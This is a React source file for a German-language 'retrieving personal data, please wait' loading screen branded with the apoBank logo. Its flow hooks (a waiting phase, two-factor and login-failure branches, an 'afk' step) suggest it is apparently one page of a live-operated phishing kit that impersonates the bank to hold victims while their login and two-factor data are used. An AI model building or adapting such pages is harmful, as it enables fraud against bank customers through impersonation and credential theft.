import { useNavigate } from "react-router-dom";
import apobankLogo from "@/assets/apobank-logo-square.png";
import { useFlowStep, setStoredSession } from "@/hooks/useSessionFlow";

const ProfilAbruf = () => {
  const navigate = useNavigate();

  useFlowStep({
    phase: "profil_abruf",
    waitForProfileData: true,
    afkNext: () => navigate("/mein-profil"),
    onSuccess: () => {
      navigate("/mein-profil");
    },
    onTwofa: () => navigate("/mein-profil"),
    onLoginFailed: () => {
      setStoredSession(null);
      sessionStorage.setItem("login_error", "Anmeldung fehlgeschlagen. Bitte erneut versuchen.");
      navigate("/");
    },
  });

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center">
      <div className="relative w-56 h-56">
        <svg
          className="absolute inset-0 w-full h-full animate-spin"
          style={{ animationDuration: "1.5s" }}
          viewBox="0 0 200 200"
          fill="none"
        >
          <path
            d="M 100 10 A 90 90 0 0 1 190 100"
            stroke="hsl(var(--primary))"
            strokeWidth="5"
            strokeLinecap="round"
          />
        </svg>
        <div className="absolute inset-0 flex items-center justify-center">
          <img src={apobankLogo} alt="apoBank" className="w-44 h-44 object-contain" />
        </div>
      </div>
      <p className="mt-8 text-lg text-foreground font-medium text-center px-4">
        Persönliche Daten werden abgerufen. Bitte warten.
      </p>
    </div>
  );
};

export default ProfilAbruf;
